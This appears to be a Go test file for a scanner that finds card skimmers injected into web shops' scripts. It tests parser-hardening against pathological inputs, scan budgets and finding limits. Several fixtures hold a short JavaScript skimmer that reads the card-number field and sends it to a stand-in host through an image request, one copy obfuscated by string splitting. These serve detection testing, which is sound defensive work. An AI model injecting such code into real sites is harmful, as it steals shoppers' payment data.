package web

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cpibia/tripwatch/internal/collector"
)

// A hostile script cannot make the folding slow or deep: nested parentheses, endless chains,
// arrays never joined, unterminated literals and replacements that would make megabytes cost a
// few terms a token, the bytes they produce counted, within the bound of a piece. The work is counted rather than timed, so that a slow runner cannot fail the test.
func TestFoldingHostileScripts(t *testing.T) {
	x4 := "var c='" + strings.Repeat("x", 4000) + "';"
	for name, src := range map[string]string{
		"nesting":    strings.Repeat("(", 200000) + `"a"` + strings.Repeat(")", 200000),
		"chain":      strings.Repeat(`"ab"+`, 100000) + `"c"`,
		"arrays":     strings.Repeat(`["a",`, 100000),
		"open":       strings.Repeat(`'`, 1<<20),
		"templates":  strings.Repeat("`${'", 100000),
		"assignment": strings.Repeat(`var a=a+a;`, 50000) + `var a="xy";`,
		"constant chains": "var a='" + strings.Repeat("a", 4000) + "';" +
			strings.Repeat(strings.Repeat("(", 32)+strings.Repeat("a+", 2000)+"a;", 1<<20/(32+4002)),
		"replace all":       x4 + strings.Repeat("c.replaceAll('x',c);", 1<<20/20),
		"replace all empty": x4 + strings.Repeat("c.replaceAll('',c);", 1<<20/19),
		"replace chain":     x4 + "c" + strings.Repeat(".replaceAll('',c)", 1<<20/17),
		"open classes":      strings.Repeat("/[", 1<<19),
		"open quotes":       strings.Repeat(`"`+strings.Repeat(`\"`, 2000)+"\n", 1<<20/4002),
	} {
		_, tokens, steps := foldWork([]byte(src), newFoldConstants())
		// Eight terms a token, and the bytes scanned at most twice over.
		if steps > 8*tokens+len(src)/8 || steps >= maxFoldSteps {
			t.Errorf("%s: %d terms for %d tokens", name, steps, tokens)
		}
	}
}

// A run past its time stops reading changed scripts for skimmers and says how many were left.
func TestSkimmerSearchStopsWithTheRun(t *testing.T) {
	s := &scanner{src: collector.NewSource(t.TempDir()), budget: newHashBudget(), findings: map[string]int{}, report: AppReport{}}
	s.report.Path = "/var/www/shop"
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	s.inspectCandidates(ctx, skimmerCandidates{others: []FileChange{{Path: "/var/www/shop/a.js"}, {Path: "/var/www/shop/b.js"}}, count: 2})
	if len(s.issues) != 1 || !strings.Contains(s.issues[0], "2 changed scripts not read for skimmers") {
		t.Errorf("issues = %q", s.issues)
	}
}

// Findings that raise no alert have a bound of their own, and past the bound a more severe
// finding takes the place of a less severe one; a skimmer left out leaves its script pending.
func TestFindingBoundsBySeverity(t *testing.T) {
	root := t.TempDir()
	skim := "var f=document.querySelector('[name=\"payment[cc_number]\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value"
	if err := os.WriteFile(filepath.Join(root, "app.js"), []byte(skim), 0o600); err != nil {
		t.Fatal(err)
	}
	entries, err := os.ReadDir(root)
	if err != nil {
		t.Fatal(err)
	}
	e := entries[0]
	fill := func(kind string, n int) *scanner {
		s := &scanner{src: collector.NewSource(root), budget: newHashBudget(), findings: map[string]int{}}
		for i := range n {
			s.add(kind, fmt.Sprintf("d/%d", i), e, nil)
		}
		return s
	}
	quiet := fill(KindExternalSymlink, maxQuietFindings+5)
	if quiet.add(KindHiddenScript, "x.php", e, nil) == nil || quiet.report.Truncated || quiet.droppedQuiet != 5 {
		t.Errorf("quiet findings: truncated %v, dropped %d", quiet.report.Truncated, quiet.droppedQuiet)
	}
	high := fill(KindHiddenScript, maxFindingsPerApp)
	if high.add(KindSignature, "w.php", e, []string{"eval"}) == nil || high.alerting != maxFindingsPerApp || high.dropped != 1 || !high.report.Truncated {
		t.Errorf("a critical finding past the bound: alerting %d, dropped %d", high.alerting, high.dropped)
	}
	if _, seen := high.findings[KindHiddenScript+"\x00d/0"]; seen {
		t.Error("the finding taken out is still indexed")
	}
	if high.add(KindHiddenInData, "m", e, nil) != nil {
		t.Error("a less severe finding took a place")
	}
	critical := fill(KindSignature, maxFindingsPerApp)
	if critical.inspectChanged(context.Background(), FileChange{Path: "/app.js"}) {
		t.Error("a skimmer left out by the bound was taken as read")
	}
}

// Constants are kept from one piece of a script to the next, and thousands of decoys set before
// or after the real one, never used, do not push it out of the piece that uses it.
func TestFoldedConstantsAcrossPiecesAndDecoys(t *testing.T) {
	use := "var f=document.querySelector('[name=\"'+'payment[c'+a+'umber]'+'\"]');new Image().src=\"https://img.example.com/p?d=\"+f.value"
	chunked := func(src []byte) []string {
		var fam skimmerFamilies
		for off := 0; off < len(src); off += skimmerChunk {
			fam.scan(src[off:min(len(src), off+skimmerChunk+skimmerOverlap)])
		}
		return fam.verdict()
	}
	if chunked([]byte("var a='c_n';/*"+strings.Repeat("x", 2*skimmerChunk)+"*/"+use)) == nil {
		t.Error("a constant set two pieces before its use was lost")
	}
	var decoys strings.Builder
	for i := range 2 * maxFoldConstants {
		fmt.Fprintf(&decoys, "var d%d='x';", i)
	}
	for name, src := range map[string]string{
		"decoys before": decoys.String() + "var a='c_n';" + use,
		"decoys after":  "var a='c_n';" + decoys.String() + use,
	} {
		if chunked([]byte(src)) == nil {
			t.Errorf("%s: the constant was pushed out", name)
		}
	}
}
